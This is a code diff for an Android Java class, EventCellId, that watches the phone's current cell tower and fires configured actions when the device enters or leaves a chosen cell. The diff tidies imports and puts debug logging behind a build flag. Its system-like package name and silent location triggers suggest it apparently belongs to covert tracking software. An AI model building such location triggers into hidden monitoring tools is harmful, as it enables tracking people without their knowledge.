@@ -11,17 +11,11 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.content.Context;
-import android.telephony.CellLocation;
-import android.telephony.TelephonyManager;
-import android.telephony.cdma.CdmaCellLocation;
-import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 
 import com.android.service.CellInfo;
 import com.android.service.Device;
-import com.android.service.Status;
-import com.android.service.util.Check;
+import com.android.service.auto.Cfg;
 import com.android.service.util.DataBuffer;
 
 public class EventCellId extends EventBase {
@@ -63,7 +57,7 @@ public class EventCellId extends EventBase {
 			lacOrig = databuffer.readInt();
 			cidOrig = databuffer.readInt();
 
-			Log.d("QZ", TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
 					+ lacOrig + " Cid: " + cidOrig);
 
 			setPeriod(CELLID_PERIOD);
@@ -80,7 +74,7 @@ public class EventCellId extends EventBase {
 	public void go() {
 		CellInfo info = Device.getCellInfo();
 		if(!info.valid){
-			Log.d("QZ", TAG + " Error: " + "invalid cell info" );
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + "invalid cell info" );
 			return;
 		}
 		
@@ -89,20 +83,20 @@ public class EventCellId extends EventBase {
 				&& (lacOrig == -1 || lacOrig == info.lac)
 				&& (cidOrig == -1 || cidOrig == info.cid)) {
 			if (!entered) {
-				Log.d("QZ", TAG + " Enter");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Enter");
 				entered = true;
 				trigger(actionOnEnter);
 			} else {
-				Log.d("QZ", TAG + " already entered");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " already entered");
 			}
 
 		} else {
 			if (entered) {
-				Log.d("QZ", TAG + " Exit");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Exit");
 				entered = false;
 				trigger(actionOnExit);
 			} else {
-				Log.d("QZ", TAG + " already exited");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " already exited");
 			}
 		}
 	}
